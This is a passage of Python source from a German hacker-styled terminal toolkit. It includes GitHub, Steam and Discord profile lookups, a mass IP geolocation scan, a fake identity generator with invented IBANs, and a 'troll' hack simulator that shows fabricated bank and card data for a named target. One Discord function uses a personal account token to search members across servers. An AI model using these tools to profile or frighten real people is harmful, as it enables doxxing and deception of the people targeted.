        row("Username",    u.get("login","?"))
        row("Bio",         (u.get("bio") or "—")[:80])
        row("E-Mail",      u.get("email") or "—")
        row("Webseite",    u.get("blog") or "—")
        row("Firma",       u.get("company") or "—")
        row("Ort",         u.get("location") or "—")
        row("Twitter",     u.get("twitter_username") or "—")
        row("Public Repos",str(u.get("public_repos","?")))
        row("Followers",   str(u.get("followers","?")))
        row("Following",   str(u.get("following","?")))
        row("Erstellt",    (u.get("created_at") or "?")[:10])
        row("Profil",      u.get("html_url","?"))
        repos=getj(f"https://api.github.com/users/{uname}/repos?sort=stars&per_page=5")
        if repos:
            print(f"\n  {DG}Top Repos:{R}")
            for r in repos:
                desc=(r.get("description") or "")[:40]
                print(f"    {G}★ {r.get('stargazers_count',0):<6}{R} {DG}{r.get('name','?'):<25}{R} {G}{desc}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 27  STEAM PROFIL LOOKUP ──────────────────────────────────
def steam_lookup():
    hdr("STEAM PROFIL LOOKUP")
    print(f"  {DG}Vanity-URL (z.B. 'gaben'), Steam64-ID oder Profil-Link{R}\n")
    uid = inp("Input").strip().strip("/")
    div()
    if not uid:
        print(f"  {G}[!] Eingabe fehlt.{R}"); wait(); return

    # URL-Typ erkennen
    m = re.search(r'steamcommunity\.com/(id|profiles)/([^/?#]+)', uid)
    if m:
        kind, val = m.group(1), m.group(2)
    elif re.match(r'^\d{15,}$', uid):
        kind, val = "profiles", uid
    else:
        kind, val = "id", uid.split("/")[-1]

    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    url = f"https://steamcommunity.com/{kind}/{val}/?xml=1"
    print(f"  {DG}Lade Profil ...{R}", end="", flush=True)
    try:
        body, status, _ = get(url, timeout=14)
    except Exception as e:
        print(f"\n  {G}[!] {e}{R}"); wait(); return

    if "<error>" in body:
        err = re.search(r'<error>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?</error>', body, re.S)
        print(f"\n  {G}[✗] {err.group(1).strip() if err else 'Profil nicht gefunden'}{R}")
        wait(); return

    print(f" {G}OK{R}\n")

    def xtag(tag):
        r = re.search(rf'<{tag}[^>]*>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?</{tag}>', body, re.S)
        return r.group(1).strip() if r else ""

    steam64   = xtag("steamID64")
    name      = xtag("steamID")
    online    = xtag("onlineState")
    state_msg = re.sub(r'<[^>]+>','', xtag("stateMessage")).strip()
    privacy   = xtag("privacyState")
    member    = xtag("memberSince")
    location  = xtag("location")
    realname  = xtag("realname")
    vac       = xtag("vacBanned")
    trade_ban = xtag("tradeBanState")
    limited   = xtag("isLimitedAccount")
    summary   = re.sub(r'<[^>]+>','', xtag("summary")).strip()
    avatar    = xtag("avatarFull") or xtag("avatarMedium") or xtag("avatarIcon")

    # Freundesliste-Zahl (im XML als Attribut)
    friends_m = re.search(r'<friends[^>]*count="(\d+)"', body)
    friends_c = friends_m.group(1) if friends_m else "?"

    # Gruppen-Zahl
    groups_m  = re.search(r'<groups[^>]*>', body)
    groups_c  = str(len(re.findall(r'<group>', body))) if groups_m else "?"

    # Online-Farbe
    if "online" in online.lower():
        on_col = G
    elif "away" in online.lower() or "snooze" in online.lower():
        on_col = YG
    else:
        on_col = DG

    profile_url = f"https://steamcommunity.com/profiles/{steam64}" if steam64 else f"https://steamcommunity.com/{kind}/{val}"

    print(T)
    print(L(f"{YG}⬡ STEAM PROFIL  {DG}│  {G}{name}{R}"))
    print(M)
    if realname:
        print(L(f"{DG}Echter Name    {R}{G}{realname}{R}"))
    print(L(f"{DG}Anzeigename    {R}{G}{name}{R}"))
    print(L(f"{DG}Steam64-ID     {R}{YG}{steam64}{R}"))
    print(L(f"{DG}Profil-URL     {R}{G}{profile_url}{R}"))
    if avatar:
        print(L(f"{DG}Avatar         {R}{G}{avatar[:58]}{R}"))
    print(M)
    print(L(f"{DG}Online-Status  {R}{on_col}{online if online else '—'}{R}"))
    if state_msg:
        print(L(f"{DG}Status-Text    {R}{DG}{state_msg[:55]}{R}"))
    print(L(f"{DG}Sichtbarkeit   {R}{G}{privacy if privacy else '—'}{R}"))
    print(M)
    print(L(f"{DG}Mitglied seit  {R}{G}{member if member else '—'}{R}"))
    if location:
        print(L(f"{DG}Ort            {R}{G}{location}{R}"))
    print(L(f"{DG}Freunde        {R}{G}{friends_c}{R}"))
    print(L(f"{DG}Gruppen        {R}{G}{groups_c}{R}"))
    if limited == "1":
        print(L(f"{YG}⚠ Limited-Account (kein Steam Guard / wenig genutzt){R}"))
    print(M)
    # Bans
    vac_str   = f"{R}{G}⚠ VAC-BAN AKTIV" if vac == "1" else f"{R}{DG}Nein"
    trade_str = f"{R}{YG}⚠ {trade_ban}"   if trade_ban and trade_ban.lower() not in ("none","") else f"{R}{DG}Nein"
    print(L(f"{DG}VAC-Ban        {R}{vac_str}{R}"))
    print(L(f"{DG}Trade-Ban      {R}{trade_str}{R}"))
    if summary:
        print(M)
        print(L(f"{YG}Über mich:{R}"))
        # Summary in Zeilen aufteilen
        for i in range(0, min(len(summary), 180), 56):
            print(L(f"  {DG}{summary[i:i+56]}{R}"))
    print(B)
    wait()

# ── 28  QR-CODE GENERATOR ────────────────────────────────────
def qr_generator():
    hdr("QR-CODE GENERATOR")
    text=inp("Text oder URL")
    div()
    try:
        import qrcode  # type: ignore
        qr=qrcode.QRCode(border=1)
        qr.add_data(text); qr.make(fit=True)
        for row_ in qr.get_matrix():
            print("  "+"".join("██" if c else "  " for c in row_))
    except ImportError:
        enc=urllib.parse.quote(text,safe="")
        print(f"  {DG}qrcode nicht installiert — Link zum Bild:{R}\n")
        print(f"  {G}https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={enc}{R}")
        print(f"\n  {DG}Installieren mit: pip install qrcode[pil]{R}")
    wait()

# ── 29  MASSEN IP-SCAN ───────────────────────────────────────
def mass_ip_scan():
    hdr("MASSEN IP-SCAN")
    print(f"  {DG}IPs eingeben – eine pro Zeile, leere Zeile zum Starten:{R}\n")
    ips=[]
    while True:
        line=input(f"  {G}>{R} ").strip()
        if not line: break
        ips.append(line)
    if not ips:
        print(f"  {G}[!] Keine IPs eingegeben{R}"); wait(); return
    div()
    print(f"  {DG}{'IP':<20} {'Hostname':<35} {'Land / ISP'}{R}")
    print(f"  {DG}{'─'*70}{R}")
    for ip in ips:
        try:    host=socket.gethostbyaddr(ip)[0]
        except: host="—"
        try:
            geo=getj(f"http://ip-api.com/json/{ip}?fields=country,isp",timeout=5)
            info=f"{geo.get('country','?')} / {geo.get('isp','?')}"[:35]
        except: info="—"
        print(f"  {G}{ip:<20}{R} {DG}{host:<35}{R} {G}{info}{R}")
    wait()

# ── 30  FAKE IDENTITY ────────────────────────────────────────
def fake_identity():
    import random, string
    hdr("FAKE IDENTITY GENERATOR")
    div()
    rng=random.SystemRandom()
    first_m=["Leon","Noah","Finn","Elias","Jonas","Ben","Max","Lukas","Felix","Paul",
             "Nico","Tim","Jan","Erik","Tobias","Moritz","Julian","Fabian","David","Simon"]
    first_f=["Mia","Emma","Hannah","Sofia","Lena","Anna","Laura","Sara","Julia","Lara",
             "Nina","Lisa","Marie","Lea","Jana","Alina","Nele","Katharina","Clara","Amy"]
    last   =["Müller","Schmidt","Schneider","Fischer","Weber","Meyer","Wagner","Becker",
             "Hoffmann","Schulz","Koch","Richter","Klein","Wolf","Schröder","Neumann"]
    cities =[(c,z) for c,z in [("Berlin","10115"),("Hamburg","20095"),("München","80331"),
             ("Köln","50667"),("Frankfurt","60311"),("Stuttgart","70173"),
             ("Düsseldorf","40213"),("Leipzig","04109"),("Dortmund","44137")]]
    streets=["Hauptstraße","Bahnhofstraße","Schulstraße","Gartenweg","Kirchgasse",
             "Mozartstraße","Lindenallee","Rosenweg","Parkstraße","Bergstraße"]
    domains=["gmail.com","yahoo.de","outlook.de","web.de","gmx.de","t-online.de"]

    gender  = rng.choice(["m","f"])
    fname   = rng.choice(first_m if gender=="m" else first_f)
    lname   = rng.choice(last)
    city,plz= rng.choice(cities)
    street  = rng.choice(streets)
    nr      = rng.randint(1,120)
    year    = rng.randint(1975,2004)
    month   = rng.randint(1,12)
    day     = rng.randint(1,28)
    email   = f"{fname.lower()}.{lname.lower()}{rng.randint(10,99)}@{rng.choice(domains)}"
    phone   = f"+49 {rng.randint(151,179)} {rng.randint(1000000,9999999)}"
    pw_c    = string.ascii_letters+string.digits+"!@#$%^&*"
    pw      = "".join(rng.choices(pw_c,k=16))
    iban_n  = "".join(str(rng.randint(0,9)) for _ in range(18))
    iban    = f"DE{rng.randint(10,99)} {iban_n[:4]} {iban_n[4:8]} {iban_n[8:12]} {iban_n[12:16]} {iban_n[16:]}"
    uas=[
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) Safari/605",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Firefox/125.0",
    ]
    row("Name",        f"{fname} {lname}")
    row("Geschlecht",  "Männlich" if gender=="m" else "Weiblich")
    row("Geburtstag",  f"{day:02d}.{month:02d}.{year}")
    row("Adresse",     f"{street} {nr}, {plz} {city}")
    row("E-Mail",      email)
    row("Telefon",     phone)
    row("Passwort",    pw)
    row("IBAN (fake)", iban)
    row("User-Agent",  rng.choice(uas))
    print(f"\n  {DG}[ Alle Daten sind 100% erfunden ]{R}")
    wait()

# ── 31  HACK SIMULATOR [TROLL] ───────────────────────────────
def hack_simulator():
    RED = "[91m"; BRED = "[1;91m"
    import random, string
    rng = random.SystemRandom()

    def glitch(text, steps=6):
        chars = "▓▒░█▄▌▐▀$#@!%&*<>?/\\|~^"
        for i in range(steps):
            corrupted = ""
            for c in text:
                corrupted += rng.choice(chars) if rng.random()<0.4 else c
            print(f"\r  {G}{corrupted}{R}", end="", flush=True)
            time.sleep(0.06)
        print(f"\r  {G}{text}{R}          ")

    def type_out(text, delay=0.03):
        for c in text:
            print(f"{G}{c}{R}", end="", flush=True)
            time.sleep(delay + rng.uniform(0,0.02))
        print()

    def fake_progress(label, steps=20, delay=0.07):
        for i in range(steps+1):
            pct = int(i/steps*100)
            b   = "█"*i + "░"*(steps-i)
            print(f"\r  {DG}{label:<30}{R} [{G}{b}{R}] {G}{pct}%{R}", end="", flush=True)
            time.sleep(delay + rng.uniform(0,0.03))
        print()

    def fake_scan(label, count=8):
        for _ in range(count):
            ip = ".".join(str(rng.randint(1,254)) for _ in range(4))
            print(f"  {DG}>{R} {G}{label}: {ip}{R}", end="", flush=True)
            time.sleep(0.12)
            print(f"  {DG}... OK{R}")

    def fake_hex_stream(lines=5):
        for _ in range(lines):
            h = " ".join(f"{rng.randint(0,255):02X}" for _ in range(16))
            print(f"  {DG}{h}{R}")
            time.sleep(0.08)

    # ── Namen & Fake-Daten generieren ───────────────────────
    first_m = ["Leon","Noah","Finn","Elias","Jonas","Ben","Max","Lukas","Felix","Paul"]
    first_f = ["Mia","Emma","Hannah","Sofia","Lena","Anna","Laura","Sara","Julia","Lara"]
    last    = ["Müller","Schmidt","Schneider","Fischer","Weber","Meyer","Wagner","Becker","Hoffmann","Schulz"]
    cities  = [("Berlin","10115"),("Hamburg","20095"),("München","80331"),
               ("Köln","50667"),("Frankfurt","60311"),("Stuttgart","70173")]
    streets = ["Hauptstraße","Bahnhofstraße","Schulstraße","Gartenweg","Kirchgasse","Mozartstraße"]
    banks   = ["Deutsche Bank","Sparkasse","Commerzbank","ING","DKB","Postbank","Volksbank","Comdirect"]
    isps    = ["Telekom","Vodafone","O2","1&1","Unity Media","NetCologne"]

    gender  = rng.choice(["m","f"])
    fname   = rng.choice(first_m if gender=="m" else first_f)
    lname   = rng.choice(last)
    city,plz= rng.choice(cities)
    street  = rng.choice(streets)
    nr      = rng.randint(1,120)
    year    = rng.randint(1970,2002)
    month   = rng.randint(1,12)
    day     = rng.randint(1,28)
    email   = f"{fname.lower()}.{lname.lower()}{rng.randint(10,99)}@{rng.choice(['gmail.com','web.de','gmx.de','outlook.de'])}"
    phone   = f"+49 {rng.randint(151,179)} {rng.randint(1000000,9999999)}"
    ip_fake = ".".join(str(rng.randint(1,254)) for _ in range(4))
    bank    = rng.choice(banks)
    iban_n  = "".join(str(rng.randint(0,9)) for _ in range(18))
    iban    = f"DE{rng.randint(10,99)} {iban_n[:4]} {iban_n[4:8]} {iban_n[8:12]} {iban_n[12:16]} {iban_n[16:]}"
    bic     = "".join(rng.choices(string.ascii_uppercase, k=4)) + "DE" + "".join(rng.choices(string.digits,k=2))
    balance = f"{rng.randint(200,15000):,.2f} €".replace(",","X").replace(".",",").replace("X",".")
    cc_num  = " ".join(f"{rng.randint(1000,9999)}" for _ in range(4))
    cc_exp  = f"{rng.randint(1,12):02d}/{rng.randint(25,30)}"
    cc_cvv  = f"{rng.randint(100,999)}"
    pw_c    = string.ascii_letters+string.digits+"!@#$"
    pw      = "".join(rng.choices(pw_c, k=14))
    isp     = rng.choice(isps)
    mac     = ":".join(f"{rng.randint(0,255):02X}" for _ in range(6))

    # ── START ────────────────────────────────────────────────
    clear()
    print(f"\n{G}")
    print(r"  ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ")
    print(r"  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ ")
    print(r"  ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗")
    print(r"  ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║")
    print(r"  ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝")
    print(r"  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ")
    print(f"{R}")
    print(f"  {DG}[ NUR ZUM SPASS — ALLE DATEN SIND FAKE ]{R}\n")
    time.sleep(0.5)

    # Name eingeben
    name_input = input(f"  {G}>{R} {DG}Ziel eingeben (Name):{R} ").strip()
    if not name_input:
        name_input = f"{fname} {lname}"

    print()
    time.sleep(0.3)

    # Phase 1: IP tracken
    print(f"  {YG}[PHASE 1] IP-TRACKING{R}")
    fake_scan("Routing", 5)
    glitch(f"ZIEL-IP GEFUNDEN: {ip_fake}")
    time.sleep(0.3)

    # Phase 2: System scannen
    print(f"\n  {YG}[PHASE 2] SYSTEM-SCAN{R}")
    fake_progress("Firewall umgehen    ", 18, 0.06)
    fake_progress("Ports scannen       ", 20, 0.05)
    fake_progress("Exploits laden      ", 15, 0.08)
    time.sleep(0.2)

    # Phase 3: Daten extrahieren
    print(f"\n  {YG}[PHASE 3] DATEN EXTRAHIEREN{R}")
    fake_progress("Datenbank-Zugriff   ", 22, 0.06)
    print(f"\n  {DG}Rohdaten:{R}")
    fake_hex_stream(4)
    time.sleep(0.3)
    fake_progress("Daten entschlüsseln ", 20, 0.05)

    # Phase 4: Ergebnis
    print(f"\n  {YG}[PHASE 4] ERGEBNIS{R}")
    time.sleep(0.4)

    W = 60
    def L(c=""): return _mc_box_line(c, W)
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"

    fields = [
        ("ZIEL",        name_input),
        ("ECHTER NAME",  f"{fname} {lname}"),
        ("GEBURTSTAG",   f"{day:02d}.{month:02d}.{year}"),
        ("ADRESSE",      f"{street} {nr}, {plz} {city}"),
        ("E-MAIL",       email),
        ("TELEFON",      phone),
        ("IP-ADRESSE",   ip_fake),
        ("ISP",          isp),
        ("MAC-ADRESSE",  mac),
        ("PASSWORT",     pw),
    ]
    bank_fields = [
        ("BANK",         bank),
        ("IBAN",         iban),
        ("BIC",          bic),
        ("KONTOSTAND",   balance),
        ("KREDITKARTE",  cc_num),
        ("ABLAUF",       cc_exp),
        ("CVV",          cc_cvv),
    ]

    print()
    print(T)
    print(L(f"{YG}⬡ HACK REPORT  {DG}│  {G}{name_input}{R}"))
    print(M)

    for k, v in fields:
        print(f"", end="")
        sys.stdout.flush()
        time.sleep(0.08)
        print(L(f"{DG}{k:<16}{R}{G}{v}{R}"))

    print(M)
    print(L(f"{YG}⬡ BANK-DATEN{R}"))
    print(M)

    for k, v in bank_fields:
        time.sleep(0.07)
        print(L(f"{DG}{k:<16}{R}{G}{v}{R}"))

    print(B)
    print(f"\n  {G}[✔] HACK ERFOLGREICH — {name_input} wurde kompromittiert.{R}")
    print(f"\n  {DG}[ ALLE DATEN SIND 100% FAKE — NUR ZUM TROLLING ]{R}")
    wait()

# ── 32  DISCORD LOOKUP ───────────────────────────────────────

DC_HDR = {"User-Agent":"Mozilla/5.0","Accept":"application/json"}

def _dc_box(content, W):
    return _mc_box_line(content, W)

def _dc_badge(flags):
    bits = {
        1<<0:  "Discord Staff",
        1<<1:  "Partner",
        1<<2:  "HypeSquad Events",
        1<<3:  "Bug Hunter Lv1",
        1<<6:  "HypeSquad Bravery",
        1<<7:  "HypeSquad Brilliance",
        1<<8:  "HypeSquad Balance",
        1<<9:  "Early Supporter",
        1<<14: "Bug Hunter Lv2",
        1<<17: "Verified Bot Developer",
        1<<18: "Certified Moderator",
        1<<22: "Active Developer",
    }
    return [v for k,v in bits.items() if flags & k]

def _dc_boost_label(level):
    return ["Kein Boost","Level 1","Level 2","Level 3"][min(level,3)]

def _dc_feature_icons(features):
    RED = "[91m"; BRED = "[1;91m"
    icons = {
        "VERIFIED":"✔ Verifiziert","PARTNERED":"🤝 Partner",
        "COMMUNITY":"👥 Community","DISCOVERABLE":"🔍 Auffindbar",
        "VANITY_URL":"🔗 Vanity-URL","ANIMATED_ICON":"🎞 Animiertes Icon",
        "BANNER":"🖼 Banner","INVITE_SPLASH":"💦 Invite Splash",
        "VIP_REGIONS":"⭐ VIP Voice","NEWS":"📰 News-Kanal",
        "MEMBER_VERIFICATION_GATE_ENABLED":"🚪 Mitglieder-Gate",
        "WELCOME_SCREEN_ENABLED":"👋 Willkommens-Screen",
        "TICKETED_EVENTS_ENABLED":"🎟 Ticket-Events",
        "MONETIZATION_ENABLED":"💰 Monetarisierung",
    }
    return [icons.get(f, f) for f in features if f in icons]

def dc_invite_lookup():
    hdr("DISCORD SERVER LOOKUP (INVITE)")
    code = inp("Invite-Code oder Link (z.B. discord.gg/abc123)")
    code = re.sub(r"https?://discord\.(gg|com/invite)/","",code).strip().strip("/")
    div()
    try:
        d = getj(f"https://discord.com/api/v9/invites/{code}?with_counts=true&with_expiration=true",
                 headers=DC_HDR)
        g = d.get("guild",{})
        c = d.get("channel",{})
        ap= d.get("approximate_presence_count",0)
        am= d.get("approximate_member_count",0)
        inviter = d.get("inviter",{})

        W = 62
        T = f"  {DG}╔{'═'*W}╗{R}"
        B = f"  {DG}╚{'═'*W}╝{R}"
        M = f"  {DG}╠{'═'*W}╣{R}"
        def L(c=""): return _dc_box(c, W)

        boost  = g.get("premium_subscription_count",0)
        blevel = g.get("premium_tier",0)
        feats  = _dc_feature_icons(g.get("features",[]))
        online_pct = int(ap/max(am,1)*100)
        ob = int(20*ap/max(am,1))
        onbar = f"{G}{'█'*ob}{'░'*(20-ob)}{R}"

        print()
        print(T)
        print(L(f"{YG}⬡ DISCORD SERVER{R}"))
        print(M)
        print(L(f"{DG}Name          {R}{G}{g.get('name','?')}{R}"))
        print(L(f"{DG}Server-ID     {R}{G}{g.get('id','?')}{R}"))
        print(L(f"{DG}Beschreibung  {R}{G}{(g.get('description') or '—')[:50]}{R}"))
        print(L(f"{DG}Sprache       {R}{G}{g.get('preferred_locale','?')}{R}"))
        print(L(f"{DG}NSFW          {R}{G}{'Ja ⚠' if g.get('nsfw') else 'Nein'}{R}"))
        print(M)
        print(L(f"{DG}Mitglieder    {R}{YG}{am:,}{R}"))
        print(L(f"{DG}Online        {R}[{onbar}] {G}{ap:,} ({online_pct}%){R}"))
        print(M)
        print(L(f"{DG}Boost-Level   {R}{G}{_dc_boost_label(blevel)}  ({boost} Boosts){R}"))
        print(L(f"{DG}Invite-Kanal  {R}{G}#{c.get('name','?')}{R}"))
        expires = d.get("expires_at")
        print(L(f"{DG}Läuft ab      {R}{G}{expires[:10] if expires else 'Nie'}{R}"))
        if inviter:
            print(L(f"{DG}Erstellt von  {R}{G}{inviter.get('username','?')}#{inviter.get('discriminator','0')}{R}"))
        print(M)
        if feats:
            for f in feats:
                print(L(f"  {G}{f}{R}"))
        print(B)

        # Widget / Online-Liste
        gid = g.get("id")
        if gid:
            try:
                w = getj(f"https://discord.com/api/v9/guilds/{gid}/widget.json", headers=DC_HDR)
                members = w.get("members",[])
                if members:
                    print(f"\n  {YG}┌─ Online-Mitglieder (Widget) {'─'*22}┐{R}")
                    for m in members[:20]:
                        status = {"online":"●","idle":"◑","dnd":"✖"}.get(m.get("status","?"),"?")
                        print(f"  {YG}│{R}  {G}{status} {m.get('username','?')}{R}")
                    print(f"  {YG}└{'─'*42}┘{R}")
            except: pass

    except urllib.error.HTTPError as e:
        if e.code == 404:
            print(f"  {G}[✗] Invite nicht gefunden oder abgelaufen.{R}")
        else:
            print(f"  {G}[!] HTTP {e.code}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

def dc_user_lookup():
    hdr("DISCORD USER LOOKUP")
    uid = inp("User-ID (18-stellige Zahl)")
    uid = uid.strip()
    print(f"\n  {DG}Account-Token optional (leer = nur Snowflake-Daten):{R}")
    token = input(f"  {G}>{R} Token: ").strip()
    div()

    # Snowflake → Erstellungsdatum (funktioniert immer ohne Token)
    try:
        ts      = (int(uid) >> 22) + 1420070400000
        created = datetime.utcfromtimestamp(ts/1000).strftime("%Y-%m-%d %H:%M:%S UTC")
        now     = datetime.utcnow()
        age_d   = (now - datetime.utcfromtimestamp(ts/1000)).days
        age_str = f"{age_d//365}J {(age_d%365)//30}M {age_d%30}T"
    except:
        created = "?"; age_str = "?"

    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    u = {}
    if token:
        auth_headers = {**DC_HDR, "Authorization": token}
        try:
            u = getj(f"https://discord.com/api/v10/users/{uid}", headers=auth_headers)
        except urllib.error.HTTPError as e:
            codes = {401:"Ungültiger Token",403:"Keine Berechtigung",404:"User nicht gefunden",429:"Rate-Limit"}
            print(f"  {G}[!] {codes.get(e.code, f'HTTP {e.code}')}{R}\n")
        except Exception as e:
            print(f"  {G}[!] {e}{R}\n")

    print()
    print(T)
    print(L(f"{YG}⬡ DISCORD USER{R}"))
    print(M)
    print(L(f"{DG}User-ID        {R}{G}{uid}{R}"))
    print(L(f"{DG}Account seit   {R}{G}{created}{R}"))
    print(L(f"{DG}Account-Alter  {R}{G}{age_str}{R}"))

    if u:
        uname  = u.get("username","?")
        disc   = u.get("discriminator","0")
        tag    = uname if disc in ("0","") else f"{uname}#{disc}"
        gname  = u.get("global_name") or "—"
        flags  = u.get("public_flags",0)
        badges = _dc_badge(flags)
        bot    = u.get("bot", False)
        avatar = u.get("avatar","")
        banner = u.get("banner","")
        accent = u.get("accent_color")

        print(M)
        print(L(f"{DG}Username       {R}{G}{tag}{R}"))
        print(L(f"{DG}Display Name   {R}{G}{gname}{R}"))
        if bot:
            print(L(f"{DG}Typ            {R}{G}🤖 BOT-Account{R}"))
        if accent:
            print(L(f"{DG}Profilfarbe    {R}{G}#{accent:06X}{R}"))

        if avatar:
            ext = "gif" if avatar.startswith("a_") else "png"
            print(L(f"{DG}Avatar         {R}{G}https://cdn.discordapp.com/avatars/{uid}/{avatar}.{ext}?size=512{R}"))
        if banner:
            ext = "gif" if banner.startswith("a_") else "png"
            print(L(f"{DG}Banner         {R}{G}https://cdn.discordapp.com/banners/{uid}/{banner}.{ext}?size=512{R}"))

        if badges:
            print(M)
            print(L(f"{YG}Badges:{R}"))
            for b in badges:
                print(L(f"  {G}✦ {b}{R}"))
    else:
        print(M)
        print(L(f"{DG}Info           {R}{DG}Kein Token → nur Snowflake-Daten{R}"))
        print(L(f"{DG}Tipp           {R}{DG}Bot-Token eingeben für Username/Badges/Avatar{R}"))
        print(L(f"{DG}Bot erstellen  {R}{G}discord.com/developers/applications{R}"))

    print(B)
    wait()

def dc_widget_lookup():
    hdr("DISCORD GUILD WIDGET")
    gid = inp("Guild/Server-ID")
    gid = gid.strip()
    div()
    try:
        w = getj(f"https://discord.com/api/v9/guilds/{gid}/widget.json", headers=DC_HDR)
        W = 60
        T = f"  {DG}╔{'═'*W}╗{R}"
        B = f"  {DG}╚{'═'*W}╝{R}"
        M = f"  {DG}╠{'═'*W}╣{R}"
        def L(c=""): return _dc_box(c, W)

        members = w.get("members",[])
        channels= w.get("channels",[])

        print()
        print(T)
        print(L(f"{YG}⬡ DISCORD WIDGET{R}"))
        print(M)
        print(L(f"{DG}Server-Name   {R}{G}{w.get('name','?')}{R}"))
        print(L(f"{DG}Server-ID     {R}{G}{w.get('id','?')}{R}"))
        print(L(f"{DG}Online        {R}{G}{len(members)} sichtbare Mitglieder{R}"))
        print(L(f"{DG}Channels      {R}{G}{len(channels)} öffentliche Voice-Kanäle{R}"))
        invite = w.get("instant_invite")
        if invite:
            print(L(f"{DG}Invite        {R}{G}{invite}{R}"))
        print(M)
        if channels:
            print(L(f"{YG}Voice-Kanäle:{R}"))
            for ch in channels[:10]:
                print(L(f"  {DG}#{ch.get('name','?'):<25}{R} {G}ID: {ch.get('id','?')}{R}"))
        print(M)
        if members:
            print(L(f"{YG}Online-Mitglieder:{R}"))
            for m in members[:20]:
                status = {"online":"● Online","idle":"◑ Abwesend","dnd":"✖ Bitte nicht stören"}.get(
                    m.get("status","?"), "? Unbekannt")
                game = m.get("game",{})
                act  = f"  spielt {game.get('name','')}" if game else ""
                print(L(f"  {G}{status:<20}{R} {DG}{m.get('username','?')}{G}{act}{R}"))
        else:
            print(L(f"  {DG}Keine Mitglieder sichtbar (Widget evtl. eingeschränkt){R}"))
        print(B)
    except urllib.error.HTTPError as e:
        if e.code == 403:
            print(f"  {G}[✗] Widget ist auf diesem Server deaktiviert.{R}")
        elif e.code == 404:
            print(f"  {G}[✗] Server nicht gefunden.{R}")
        else:
            print(f"  {G}[!] HTTP {e.code}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

def dc_username_to_id():
    hdr("DISCORD USER SUCHE")
    print(f"  {DG}Sucht den User automatisch in allen deinen Servern.{R}\n")
    token = input(f"  {G}>{R} Dein Token: ").strip()
    query = input(f"  {G}>{R} Username suchen: ").strip()
    div()

    if not token or not query:
        print(f"  {G}[!] Token und Username eingeben.{R}"); wait(); return

    auth = {**DC_HDR, "Authorization": token}

    # Erst eigene Server holen
    print(f"  {DG}Lade deine Server ...{R}", end="", flush=True)
    try:
        guilds = getj("https://discord.com/api/v10/users/@me/guilds?limit=200", headers=auth)
    except urllib.error.HTTPError as e:
        print()
        msgs = {401:"Ungültiger Token — Token neu kopieren.",403:"Zugriff verweigert.",429:"Rate-Limit."}
        print(f"\n  {G}[!] {msgs.get(e.code, f'HTTP {e.code}')}{R}"); wait(); return
    except Exception as e:
        print(f"\n  {G}[!] {e}{R}"); wait(); return

    print(f" {G}{len(guilds)} Server gefunden.{R}\n")

    found_user = None
    found_in   = []

    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    fi = 0

    for guild in guilds:
        gid   = guild.get("id")
        gname = guild.get("name","?")
        print(f"\r  {G}{frames[fi%len(frames)]}{R} {DG}Suche in: {gname[:35]:<35}{R}", end="", flush=True)
        fi += 1
        try:
            url     = f"https://discord.com/api/v10/guilds/{gid}/members/search?query={urllib.parse.quote(query)}&limit=5"
            members = getj(url, headers=auth)
            for member in members:
                u     = member.get("user",{})
                uname = u.get("username","")
                gname2= u.get("global_name","") or ""
                # Prüfen ob Username oder Display-Name passt
                if (query.lower() in uname.lower() or
                    (gname2 and query.lower() in gname2.lower())):
                    if not found_user:
                        found_user = u
                    uid = u.get("id","")
                    nick    = member.get("nick") or ""
                    joined  = (member.get("joined_at") or "")[:10]
                    roles_c = len(member.get("roles",[]))
                    found_in.append({
                        "server": guild.get("name","?"),
                        "nick":   nick,
                        "joined": joined,
                        "roles":  roles_c,
                    })
        except urllib.error.HTTPError as e:
            if e.code == 429:
                time.sleep(1)
        except:
            pass

    print(f"\r  {G}✔{R} {DG}Alle Server durchsucht.{R}          \n")

    if not found_user:
        print(f"  {G}[✗] Kein User mit '{query}' gefunden.{R}"); wait(); return

    # Profil-Details holen
    uid   = found_user.get("id","?")
    uname = found_user.get("username","?")
    disc  = found_user.get("discriminator","0")
    tag   = uname if disc in ("0","") else f"{uname}#{disc}"
    gname = found_user.get("global_name") or "—"
    bot   = found_user.get("bot", False)
    avatar= found_user.get("avatar","")

    try:
        ts      = (int(uid) >> 22) + 1420070400000
        created = datetime.utcfromtimestamp(ts/1000).strftime("%Y-%m-%d %H:%M:%S")
        age_d   = (datetime.utcnow() - datetime.utcfromtimestamp(ts/1000)).days
        age_str = f"{age_d//365}J {(age_d%365)//30}M {age_d%30}T"
    except:
        created = "?"; age_str = "?"

    ext    = "gif" if avatar and avatar.startswith("a_") else "png"
    av_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.{ext}?size=512" if avatar else "—"

    # Badges via separatem Aufruf
    badges = []
    try:
        full = getj(f"https://discord.com/api/v10/users/{uid}", headers=auth)
        badges = _dc_badge(full.get("public_flags",0))
    except: pass

    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
